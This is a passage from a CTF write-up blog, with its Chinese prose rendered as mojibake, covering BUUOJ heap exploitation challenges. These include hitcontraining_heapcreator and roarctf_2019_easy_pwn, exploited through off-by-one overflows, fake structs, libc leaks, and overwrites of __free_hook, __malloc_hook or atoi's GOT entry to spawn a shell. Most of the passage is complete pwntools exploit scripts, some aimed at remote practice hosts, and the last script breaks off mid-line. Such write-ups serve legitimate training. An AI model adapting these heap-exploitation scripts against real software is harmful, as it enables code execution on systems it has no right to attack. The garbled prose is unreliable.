python"><table><tr><td class="code"><pre><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(leak_heap_addr+<span class="number">0x70</span>)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_libc_addr&#x27;</span>,<span class="built_in">hex</span>(leak_libc_addr))</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x5ca010</span></span><br><span class="line">log(<span class="string">&#x27;libc_base_addr&#x27;</span>,<span class="built_in">hex</span>(libc_base_addr))</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°äº†libcåŸºåœ°å€ï¼Œæˆ‘ä»¬å°±å»åŠ«æŒ__free_hookï¼Œæ”¾å…¥one_gadgetåœ°å€ï¼ŒåŠ«æŒæ–¹æ³•è·Ÿæ³„éœ²libcåœ°å€ä¸€æ ·ï¼Œæˆ‘ä»¬å°†ç»“æ„ä½“å †å—ï¼ˆè¿™ä¸ªç»“æ„ä½“å †å—æ˜¯å­˜æ”¾mmapæ˜ å°„åœ°å€çš„é‚£ä¸ªå †å—ï¼‰ä¸­çš„descriptionæ”¹æˆ__free_hookçš„åœ°å€ï¼Œç„¶åç¼–è¾‘è¯¥ç»“æ„ä½“ï¼Œå†™å…¥one_gadgetåœ°å€ã€‚æœ€åå†é‡Šæ”¾æ‰éšä¾¿ä¸€ä¸ªå †å—ï¼Œå³å¯è·å–shellã€‚åŠ«æŒ__free_hookéƒ¨åˆ†çš„è„šæœ¬å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget=libc_base_addr+<span class="number">0x4527a</span></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct=p64(free_hook)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">edit(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x128B</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;tttt&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;cccc&#x27;</span>,<span class="number">0x21000</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">leak_heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_heap_addr&#x27;</span>,<span class="built_in">hex</span>(leak_heap_addr))</span><br><span class="line"></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(leak_heap_addr+<span class="number">0x70</span>)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_libc_addr&#x27;</span>,<span class="built_in">hex</span>(leak_libc_addr))</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x5ca010</span></span><br><span class="line">log(<span class="string">&#x27;libc_base_addr&#x27;</span>,<span class="built_in">hex</span>(libc_base_addr))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget=libc_base_addr+<span class="number">0x4527a</span></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct=p64(free_hook)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">edit(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h2><h3 id="æ•´ä½“æ€è·¯ï¼š"><a href="#æ•´ä½“æ€è·¯ï¼š" class="headerlink" title="æ•´ä½“æ€è·¯ï¼š"></a>æ•´ä½“æ€è·¯ï¼š</h3><p>åˆ©ç”¨off_by_oneæŠŠåŸæœ¬çš„ç»“æ„ä½“å †å—é‡Šæ”¾å†ç”³è¯·å˜æˆäº†ç”³è¯·çš„å †å—ï¼Œè€ŒåŸæœ¬çš„ç”³è¯·å †å—é‡Šæ”¾å†ç”³è¯·æˆäº†ç»“æ„ä½“å †å—ï¼Œä»è€Œæ§åˆ¶ç»“æ„ä½“å †å—ä¸­çš„å †å—ä¿¡æ¯ã€‚å…³é”®ç‚¹å°±æ˜¯è¦æŠŠç¬¬äºŒä¸ªå †å—ç”³è¯·æˆ0x10å­—èŠ‚çš„ï¼ˆå› ä¸ºè¦ä¿è¯ç”³è¯·ç»“æ„ä½“å †å—çš„æ—¶å€™ï¼ŒæŠŠè¿™ä¸ªå †å—é‡Šæ”¾æ‰å†ç”³è¯·å›æ¥ï¼‰</p><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-2"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-2" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221007204845732.png" alt="image-20221007204845732"></p><h3 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h3><p>å„ä¸ªå‡½æ•°å®ç°çš„ä»€ä¹ˆåŠŸèƒ½ï¼Œæˆ‘å°±ä¸è¯´äº†ï¼Œåº”è¯¥éƒ½èƒ½çœ‹å‡ºæ¥ã€‚åˆ†æå‡ ä¸ªæœ‰ç”¨çš„ç‚¹ã€‚</p><p>é¦–å…ˆè¿™é“é¢˜æ˜¯æœ‰ä¸€ä¸ªç»“æ„ä½“ï¼ˆmallocç”³è¯·äº†å®ƒçš„å¤§å°ä¸º0x10)ï¼Œå®ƒç”¨æ¥è®°å½•ç”³è¯·çš„æ¯ä¸ªchunkçš„sizeå’Œåœ°å€ã€‚ï¼ˆä»ä¸‹é¢ä¸¤ä¸ªå›¾ç‰‡å¯ä»¥åˆ†æå‡ºæ¥ï¼‰</p><p><img src="/../img/ZC1bBRYu9pnxK5q-1665146431268-57.png" alt="image-20220602080236010"></p><p><img src="/../img/WhklgpXZ3A1yY9L-1665146431268-58.png" alt="image-20220602080259732"></p><p>è€Œå®ä¾‹åŒ–çš„æ¯ä¸ªç»“æ„ä½“çš„åœ°å€å­˜æ”¾åˆ°äº†bssæ®µä¸Šã€‚è€Œä¹‹åå»å¯»æ‰¾æŒ‡å®šçš„chunkè¿›è¡Œåˆ ï¼Œæ”¹ï¼Œæ‰“å°æ“ä½œéƒ½æ˜¯å…ˆå»bssæ®µä¸Šå»æ‰¾å­˜æ”¾çš„å¯¹åº”ç»“æ„ä½“ï¼Œç„¶åæ ¹æ®åç§»æ¥å¯»æ‰¾å…¶ä¸­çš„è®°å½•ä¿¡æ¯çš„sizeå’Œåœ°å€æˆå‘˜ã€‚</p><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p><img src="/../img/image-20221007204901719.png" alt="image-20221007204901719"></p><p>è¿™é‡Œå¯ä»¥è¾“å…¥æ¯”ç”³è¯·çš„sizeå¤šä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œå­˜åœ¨åˆ»æ„çš„off_by_oneæ¼æ´ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯ï¼š-2"><a href="#åˆ©ç”¨æ€è·¯ï¼š-2" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>æˆ‘ä»¬å…ˆç”³è¯·ä¸¤ä¸ªchunkï¼Œçœ‹ä¸€ä¸‹å¸ƒå±€æ˜¯æ€æ ·çš„ã€‚</p><p><img src="/../img/image-20221007204910840.png" alt="image-20221007204910840"></p><p>å¯ä»¥å‘ç°æˆ‘ä»¬æ¯æ·»åŠ ä¸€ä¸ªchunkï¼Œéƒ½ä¼šåœ¨å®ƒä¸Šé¢ï¼ˆä½åœ°å€ï¼‰æœ‰ä¸€ä¸ªï¼Œç»“æ„ä½“å †å—æ¥è®°å½•ä¿¡æ¯ã€‚å¯æ˜¯ç°åœ¨æˆ‘ä»¬å¯ä»¥ç”¨editå¾€é‡Œé¢å¤šå†™ä¸€ä¸ªæ•°æ®ï¼Œæ­£å¥½å¯ä»¥æº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªç»“æ„ä½“å †å—çš„sizeä½ï¼Œè¿™æ„å‘³ç€å¯ä»¥æ§åˆ¶ä¸‹ä¸€ä¸ªç»“æ„ä½“å †å—çš„å¤§å°ã€‚</p><p><img src="/../img/image-20221007204918905.png" alt="image-20221007204918905"></p><p>ç°åœ¨æˆ‘ä»¬åˆ©ç”¨æº¢å‡ºæŠŠè¿™ä¸ªchunkçš„å¤§å°æ”¹æˆ0x41ï¼ˆå¦‚ä¸Šå›¾ï¼‰ï¼Œè¿™å°±æ„å‘³ç€ç¨‹åºç°åœ¨æŠŠåŸæœ¬çš„ç»“æ„ä½“å †å—å’Œæˆ‘ä»¬ç”³è¯·çš„chunkå½“æˆäº†ä¸€ä¸ªç»“æ„ä½“chunkã€‚ç°åœ¨æˆ‘ä»¬æ‰§è¡Œdelete(1)å°†å…¶åˆ é™¤ï¼Œæˆ‘ä»¬å°±ä¼šå¾—åˆ°ä¸¤ä¸ªå¤„äºé‡Šæ”¾æ‰çš„chunkï¼ˆæŠŠç”³è¯·çš„chunkï¼ˆå¤§å°ä¸º0x20)å’Œç»“æ„ä½“å †å—ï¼ˆæ­¤æ—¶æ˜¯0x41äº†ï¼‰éƒ½é‡Šæ”¾æ‰äº†ï¼‰å¦‚ä¸‹å›¾</p><p><img src="/../img/image-20221007204926366.png" alt="image-20221007204926366"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ ¸å¿ƒåˆ©ç”¨ç‚¹ï¼Œæˆ‘ä»¬å†ç”³è¯·0x30çš„å¤§å°ï¼Œè¿™æ ·fastbiné‡Œ0x40çš„chunkå°±ä¼šè¢«ç”³è¯·å›åŸæ¥çš„ä½ç½®ã€‚ä¸æ­¤åŒæ—¶ç¨‹åºä¼šè‡ªå·±ç”³è¯·ä¸€ä¸ª0x10çš„chunkï¼Œä¹Ÿå°±å°†fastbiné‡Œçš„0x20ä¹Ÿç”³è¯·å›å»äº†ã€‚<strong>ä½†0x40çš„è¿™ä¸ªchunkåŒ…å«äº†0x20çš„è¿™ä¸ªchunkï¼Œè€Œ0x40æ˜¯ç”¨æˆ·å †å—ï¼Œæˆ‘ä»¬å¯ä»¥å¾€é‡Œé¢å†™å…¥æ•°æ®ï¼Œä»è€Œä¿®æ”¹é‡Œé¢çš„0x20çš„ç»“æ„ä½“å †å—ã€‚</strong>(å¦‚ä¸‹å›¾)</p><p><img src="/../img/image-20221007204934515.png" alt="image-20221007204934515"></p><p><u>åŸæœ¬ç»“æ„ä½“å †å—æ˜¯æ¥æè¿°chunk1çš„ä¿¡æ¯çš„ï¼ˆæ¢å¥è¯å°±æ˜¯ï¼Œè°æ˜¯chunk1æ˜¯ç”±ç»“æ„ä½“å †å—è¯´äº†ç®—ï¼‰ï¼Œç»“æœç°åœ¨ç»“æ„ä½“å †å—åˆ°äº†chunk1çš„é‡Œé¢ï¼Œå› æ­¤ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ§åˆ¶ç»“æ„ä½“å †å—æ¥ä¼ªé€ chunk1ã€‚</u></p><p>æˆ‘ä»¬å°†chunk1çš„åœ°å€æ”¹æˆï¼ˆä¹Ÿå°±æ˜¯åœ¨æ”¹ç»“æ„ä½“å †å—çš„åœ°å€æˆå‘˜ï¼‰atoiçš„gotè¡¨ï¼Œå†æ‰§è¡Œshowå‡½æ•°çš„æ—¶å€™ï¼Œæœ¬æ¥æ˜¯æ‰“å°chunk1åœ°å€é‡Œçš„å†…å®¹çš„ï¼Œå¯æ˜¯ç°åœ¨chunk1çš„åœ°å€æ”¹æˆäº†atoiçš„gotè¡¨ï¼Œå› æ­¤å®ç°äº†æ³„éœ²atoiçš„çœŸå®åœ°å€ã€‚åŒç†ï¼Œæ‰§è¡Œeditå‡½æ•°çš„æ—¶å€™ï¼Œæœ¬æ¥æ˜¯è¦ä¿®æ”¹chunk1åœ°å€é‡Œçš„å†…å®¹ï¼Œç»“æœç°åœ¨chunk1çš„åœ°å€æ”¹æˆäº†atoiçš„gotè¡¨ï¼Œå› æ­¤å°±ç›¸å½“äºä¿®æ”¹atoiçš„çœŸå®åœ°å€äº†ï¼Œæ”¹ä¸ºsystemï¼Œä¼ å…¥&#x2F;bin&#x2F;shå³å¯è·å–shellã€‚<strong>ï¼ˆè¦æ³¨æ„çš„å°±æ˜¯å†™å…¥atoiçš„gotè¡¨æ—¶ï¼Œé¡ºä¾¿è¦ä¼ªé€ ä¸€ä¸ªsizeï¼Œå› ä¸ºeditçš„æ—¶å€™è¿˜éœ€è¦ç”¨åˆ°è¿™ä¸ªsizeï¼Œå¦‚æœå¡«å……æˆ0çš„è¯ï¼Œæ˜¯å†™ä¸è¿›å»æ•°æ®çš„ï¼‰</strong></p><h3 id="EXPï¼š-1"><a href="#EXPï¼š-1" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x400A43</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29606)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content of heap:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content of heap : &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;efgh&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x20</span>)+p64(atoi_got_addr))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr_bin_sh_addr=long_search(&#x27;atoi&#x27;,atoi_addr)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><h3 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥;"></a>ä¿æŠ¤ç­–ç•¥;</h3><p><img src="/../img/image-20221007205054593.png" alt="image-20221007205054593"></p><h3 id="æ¼æ´åˆ†æï¼š-2"><a href="#æ¼æ´åˆ†æï¼š-2" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h3><p><img src="/../img/image-20221007205111216.png" alt="image-20221007205111216"></p><p>çŒ›ä¸€çœ‹æ„Ÿè§‰æ˜¯å¸¸è§„å †æº¢å‡ºï¼Œæ²¡æœ‰å¯¹editå‡½æ•°ä¸­çš„è¾“å…¥æ•°æ®çš„å¤§å°åšæ£€æŸ¥ã€‚ä¸è¿‡ä»”ç»†ç‚¹å¼€sub_E26è¿™ä¸ªå‡½æ•°å‘ç°ï¼Œæ˜¯è¿›è¡Œäº†æ£€æŸ¥ï¼Œå¦‚æœeditå‡½æ•°ä¸­çš„sizeå¤§äºäº†addå‡½æ•°æ—¶å †å—çš„å¤§å°ï¼Œé‚£ä¹ˆå°±é€‰æ‹©addå‡½æ•°æ—¶å †å—çš„å¤§å°ï¼Œå¦‚æœeditå‡½æ•°ä¸­çš„sizeå°äºäº†addå‡½æ•°æ—¶åˆ›å»ºçš„å †å—å¤§å°ï¼Œé‚£ä¹ˆå°±é€‰æ‹©editå‡½æ•°çš„sizeã€‚</p><p>ä¸è¿‡è¿˜æœ‰ä¸€ç§æƒ…å†µäº§ç”Ÿäº†off by oneçš„æ¼æ´ï¼Œä¹Ÿå°±æ˜¯editå‡½æ•°ä¸­çš„sizeæ­£å¥½æ¯”addå‡½æ•°åˆ›å»ºå †å—å¤§å°å¤§äº†10,ï¼Œæ­¤æ—¶å°±ä¼šäº§ç”Ÿoff by oneæ¼æ´ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="/../img/image-20221007205123375.png" alt="image-20221007205123375"></p><h3 id="åˆ©ç”¨æ€è·¯ï¼š-3"><a href="#åˆ©ç”¨æ€è·¯ï¼š-3" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>ç„¶åå°±æ˜¯å¸¸è§„çš„off by oneæ‰‹æ³•ï¼Œä¸Šé¢å·²ç»è®²è¿‡äº†ã€‚å¤§è‡´å°±æ˜¯off by oneé€ æˆåˆå¹¶ä¹‹åï¼Œspy_chunkä½äºäº†ä¸€ç‰‡freeçš„å†…å­˜ä¸­ï¼Œç„¶åè¿›è¡Œç”³è¯·ä¸€å®šå¤§å°çš„sizeï¼Œæ­£å¥½å°†spy_chunkçš„ç”¨æˆ·åŒºåŸŸä¸Šå­˜æ”¾unsortedbin ä¸­çš„fdæŒ‡é’ˆï¼Œç„¶åå°†å…¶æ‰“å°å‡ºæ¥ï¼Œè·å–libcåŸºåœ°å€ã€‚</p><p>ç„¶åå°†spy chunké‡Šæ”¾æ‰ï¼Œå†ç”³è¯·å›æ¥ï¼Œæ‰“fastbin attackï¼Œå°†__malloc_hookç”³è¯·å‡ºæ¥ï¼Œæ‰“one_gadgetã€‚</p><p>ç„¶è€Œå‘ç°æ‰€æœ‰çš„one_gadgetéƒ½ä¸èƒ½ä½¿ç”¨ï¼Œé‚£é€‰æ‹©ç”¨reallocå‡½æ•°æ¥è°ƒæ•´æ ˆå¸§ï¼Œå†æ‰“one_gadgetã€‚ä½¿ç”¨reallocå‡½æ•°è°ƒæ•´æ ˆå¸§å¯ä»¥çœ‹<a href="https://www.cnblogs.com/ZIKH26/articles/16421631.html">è¿™ç¯‡æ–‡ç« </a></p><h3 id="EXPï¼š-2"><a href="#EXPï¼š-2" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28799</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size)) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#merged chunk</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#merge chunk</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#prevent merge chunk</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="number">0x60</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x100</span>)+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">write(<span class="number">1</span>,<span class="number">114</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span 